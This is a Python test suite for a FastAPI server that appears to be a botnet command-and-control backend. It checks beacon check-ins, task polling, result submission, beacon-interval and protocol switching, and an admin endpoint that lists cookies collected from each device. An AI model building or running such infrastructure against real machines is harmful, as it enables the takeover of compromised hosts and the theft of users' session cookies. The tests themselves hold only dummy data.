"""Tests for the FastAPI server endpoints."""

import pytest

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from httpx import ASGITransport, AsyncClient

from server import app, handler


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def reset_handler():
    """Reset the server handler state before each test."""
    handler.devices.clear()
    handler._seed_sample_devices()
    handler.server_config.beacon_interval = 2
    handler.server_config.communication_protocol = "https"


@pytest.fixture
async def client():
    """Create an async test client for the FastAPI app."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as c:
        yield c


# ---------------------------------------------------------------------------
# Health endpoint
# ---------------------------------------------------------------------------

class TestHealth:
    """Tests for GET /health."""

    @pytest.mark.asyncio
    async def test_health_returns_200(self, client: AsyncClient) -> None:
        resp = await client.get("/health")
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "healthy"

    @pytest.mark.asyncio
    async def test_health_includes_config(self, client: AsyncClient) -> None:
        resp = await client.get("/health")
        data = resp.json()
        assert "config" in data
        assert "beacon_interval" in data["config"]
        assert "communication_protocol" in data["config"]


# ---------------------------------------------------------------------------
# Admin endpoints (bot → server communication)
# ---------------------------------------------------------------------------

class TestAdminShowDevices:
    """Tests for GET /admin/devices."""

    @pytest.mark.asyncio
    async def test_returns_device_list(self, client: AsyncClient) -> None:
        resp = await client.get("/admin/devices")
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "success"
        devices = data["data"]["devices"]
        assert len(devices) == 3

    @pytest.mark.asyncio
    async def test_device_fields(self, client: AsyncClient) -> None:
        resp = await client.get("/admin/devices")
        devices = resp.json()["data"]["devices"]
        for d in devices:
            assert "name" in d
            assert "ip" in d
            assert "status" in d
            assert "last_seen" in d

    @pytest.mark.asyncio
    async def test_empty_device_list(self, client: AsyncClient) -> None:
        handler.devices.clear()
        resp = await client.get("/admin/devices")
        data = resp.json()
        assert data["data"]["devices"] == []
        assert "0 device" in data["message"]


class TestAdminRequestCookies:
    """Tests for GET /admin/cookies."""

    @pytest.mark.asyncio
    async def test_returns_cookies(self, client: AsyncClient) -> None:
        resp = await client.get("/admin/cookies")
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "success"
        cookies = data["data"]["cookies_by_device"]
        assert "device-alpha" in cookies
        assert "session_id" in cookies["device-alpha"]

    @pytest.mark.asyncio
    async def test_excludes_devices_without_cookies(
        self, client: AsyncClient
    ) -> None:
        resp = await client.get("/admin/cookies")
        cookies = resp.json()["data"]["cookies_by_device"]
        # device-gamma has empty cookies, should not appear
        assert "device-gamma" not in cookies

    @pytest.mark.asyncio
    async def test_no_cookies_at_all(self, client: AsyncClient) -> None:
        for d in handler.devices.values():
            d.cookies = {}
        resp = await client.get("/admin/cookies")
        data = resp.json()
        assert data["data"]["cookies_by_device"] == {}


class TestAdminSetBeaconInterval:
    """Tests for POST /admin/beacon-interval."""

    @pytest.mark.asyncio
    async def test_set_valid_interval(self, client: AsyncClient) -> None:
        resp = await client.post(
            "/admin/beacon-interval", json={"interval": 16}
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "success"
        assert data["data"]["beacon_interval"] == 16
        assert handler.server_config.beacon_interval == 16

    @pytest.mark.asyncio
    async def test_all_valid_intervals(self, client: AsyncClient) -> None:
        for val in [2, 4, 8, 16, 32]:
            resp = await client.post(
                "/admin/beacon-interval", json={"interval": val}
            )
            assert resp.status_code == 200
            assert handler.server_config.beacon_interval == val

    @pytest.mark.asyncio
    async def test_invalid_interval_returns_400(
        self, client: AsyncClient
    ) -> None:
        resp = await client.post(
            "/admin/beacon-interval", json={"interval": 99}
        )
        assert resp.status_code == 400

    @pytest.mark.asyncio
    async def test_missing_interval_returns_422(
        self, client: AsyncClient
    ) -> None:
        resp = await client.post("/admin/beacon-interval", json={})
        assert resp.status_code == 422


class TestAdminSetProtocol:
    """Tests for POST /admin/communication-protocol."""

    @pytest.mark.asyncio
    async def test_set_valid_protocol(self, client: AsyncClient) -> None:
        resp = await client.post(
            "/admin/communication-protocol", json={"protocol": "dns"}
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "success"
        assert data["data"]["communication_protocol"] == "dns"

    @pytest.mark.asyncio
    async def test_protocol_case_insensitive(
        self, client: AsyncClient
    ) -> None:
        resp = await client.post(
            "/admin/communication-protocol", json={"protocol": "HTTP"}
        )
        assert resp.status_code == 200
        assert handler.server_config.communication_protocol == "http"

    @pytest.mark.asyncio
    async def test_invalid_protocol_returns_400(
        self, client: AsyncClient
    ) -> None:
        resp = await client.post(
            "/admin/communication-protocol", json={"protocol": "ftp"}
        )
        assert resp.status_code == 400

    @pytest.mark.asyncio
    async def test_missing_protocol_returns_422(
        self, client: AsyncClient
    ) -> None:
        resp = await client.post(
            "/admin/communication-protocol", json={}
        )
        assert resp.status_code == 422


# ---------------------------------------------------------------------------
# Beacon check-in
# ---------------------------------------------------------------------------

class TestBeaconCheckIn:
    """Tests for POST /beacon/check-in."""

    @pytest.mark.asyncio
    async def test_register_new_device(self, client: AsyncClient) -> None:
        resp = await client.post("/beacon/check-in", json={
            "device_name": "new-beacon",
            "ip_address": "10.0.0.50",
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "registered"
        assert "beacon_interval" in data

    @pytest.mark.asyncio
    async def test_check_in_updates_device(
        self, client: AsyncClient
    ) -> None:
        await client.post("/beacon/check-in", json={
            "device_name": "device-alpha",
            "ip_address": "10.0.0.99",
        })
        device = handler.get_device("device-alpha")
        assert device.ip == "10.0.0.99"
        assert device.status == "online"

    @pytest.mark.asyncio
    async def test_check_in_with_cookies(
        self, client: AsyncClient
    ) -> None:
        resp = await client.post("/beacon/check-in", json={
            "device_name": "cookie-dev",
            "ip_address": "10.0.0.51",
            "cookies": {"session": "xyz123"},
        })
        assert resp.status_code == 200
        device = handler.get_device("cookie-dev")
        assert device.cookies == {"session": "xyz123"}

    @pytest.mark.asyncio
    async def test_check_in_returns_current_config(
        self, client: AsyncClient
    ) -> None:
        handler.server_config.beacon_interval = 16
        handler.server_config.communication_protocol = "dns"
        resp = await client.post("/beacon/check-in", json={
            "device_name": "dev-x",
            "ip_address": "10.0.0.52",
        })
        data = resp.json()
        assert data["beacon_interval"] == 16
        assert data["communication_protocol"] == "dns"

    @pytest.mark.asyncio
    async def test_check_in_missing_fields_returns_422(
        self, client: AsyncClient
    ) -> None:
        resp = await client.post("/beacon/check-in", json={
            "device_name": "no-ip",
        })
        assert resp.status_code == 422


# ---------------------------------------------------------------------------
# Beacon tasks
# ---------------------------------------------------------------------------

class TestBeaconTasks:
    """Tests for GET /beacon/tasks/{device_name}."""

    @pytest.mark.asyncio
    async def test_get_tasks_for_registered_device(
        self, client: AsyncClient
    ) -> None:
        resp = await client.get("/beacon/tasks/device-alpha")
        assert resp.status_code == 200
        data = resp.json()
        assert data["device"] == "device-alpha"
        assert data["tasks"] == []

    @pytest.mark.asyncio
    async def test_get_tasks_for_unknown_device_returns_404(
        self, client: AsyncClient
    ) -> None:
        resp = await client.get("/beacon/tasks/not-registered")
        assert resp.status_code == 404

    @pytest.mark.asyncio
    async def test_get_tasks_includes_beacon_interval(
        self, client: AsyncClient
    ) -> None:
        handler.server_config.beacon_interval = 32
        resp = await client.get("/beacon/tasks/device-alpha")
        data = resp.json()
        assert data["beacon_interval"] == 32


# ---------------------------------------------------------------------------
# Beacon result submission
# ---------------------------------------------------------------------------

class TestBeaconResult:
    """Tests for POST /beacon/result."""

    @pytest.mark.asyncio
    async def test_submit_result_accepted(
        self, client: AsyncClient
    ) -> None:
        resp = await client.post("/beacon/result", json={
            "task_id": "t-1",
            "device_name": "device-alpha",
            "success": True,
            "data": {"cookies": {"a": "b"}},
        })
        assert resp.status_code == 200
        assert resp.json()["status"] == "accepted"

    @pytest.mark.asyncio
    async def test_submit_result_unknown_device(
        self, client: AsyncClient
    ) -> None:
        resp = await client.post("/beacon/result", json={
            "task_id": "t-2",
            "device_name": "ghost-device",
            "success": False,
        })
        assert resp.status_code == 404


# ---------------------------------------------------------------------------
# Beacon config
# ---------------------------------------------------------------------------

class TestBeaconConfig:
    """Tests for GET /beacon/config."""

    @pytest.mark.asyncio
    async def test_returns_config(self, client: AsyncClient) -> None:
        resp = await client.get("/beacon/config")
        assert resp.status_code == 200
        data = resp.json()
        assert "beacon_interval" in data
        assert "communication_protocol" in data
        assert "valid_intervals" in data
        assert 4 in data["valid_intervals"]
